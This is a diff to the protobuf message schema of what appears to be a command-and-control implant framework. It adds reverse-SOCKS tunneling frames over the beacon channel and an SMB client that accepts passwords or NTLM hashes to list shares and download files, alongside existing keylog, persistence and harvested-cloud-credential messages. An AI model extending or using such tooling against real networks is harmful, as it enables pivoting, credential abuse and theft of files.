@@ -94,10 +94,12 @@ message TaskResult {
 // Helper messages for encrypted payloads
 message BeaconResultsPayload {
   repeated TaskResult results = 1;
+  repeated SocksFrame socks_frames = 2; // implant → server reverse SOCKS
 }
 
 message BeaconTasksPayload {
   repeated Task tasks = 1;
+  repeated SocksFrame socks_frames = 2; // server → implant reverse SOCKS
 }
 
 // --- Per-Task Payloads (Phase 1: Shell only) ---
@@ -390,7 +392,7 @@ message KeylogEntry {
 // --- SOCKS Proxy ---
 
 message SocksStartTask {
-  uint32 port = 1;
+  uint32 port = 1; // teamserver listen port (relay mode); implant enables reverse agent
 }
 
 message SocksStartResult {
@@ -402,6 +404,23 @@ message SocksStopTask {}
 
 message SocksStopResult {
   bool success = 1;
+}
+
+// Reverse SOCKS frames multiplexed over the encrypted beacon channel.
+enum SocksFrameOp {
+  SOCKS_FRAME_UNSPECIFIED = 0;
+  SOCKS_OPEN              = 1; // server → implant: open dial to target
+  SOCKS_OPEN_RESULT       = 2; // implant → server
+  SOCKS_DATA              = 3; // bidirectional payload
+  SOCKS_CLOSE             = 4; // bidirectional
+}
+
+message SocksFrame {
+  uint32       conn_id = 1;
+  SocksFrameOp op      = 2;
+  string       target  = 3; // host:port for OPEN
+  bytes        data    = 4;
+  int32        status  = 5; // 0 = ok
 }
 
 // --- Persistence ---
@@ -471,4 +490,30 @@ message CloudCredential {
   string secret      = 4;  // password, secret key, private key
   string extra       = 5;  // session token, project id, etc.
   string source      = 6;  // file path or env var where found
+}
+
+// --- Remote SMB client (share list / download) ---
+
+message SMBClientConfig {
+  string action    = 1; // list_shares | list_dir | download
+  string host      = 2;
+  string share     = 3; // required for list_dir / download
+  string path      = 4; // path within share (list_dir dir or download file)
+  string domain    = 5;
+  string username  = 6;
+  string password  = 7;
+  string ntlm_hash = 8;
+  bool   anonymous = 9;
+}
+
+message SMBClientResult {
+  string          action                 = 1;
+  string          host                   = 2;
+  string          share                  = 3;
+  string          path                   = 4;
+  repeated string names                  = 5; // share or directory entries
+  bytes           file_data              = 6; // download payload
+  int64           file_size              = 7;
+  string          error                  = 8;
+  repeated string next_suggested_actions = 9;
 }
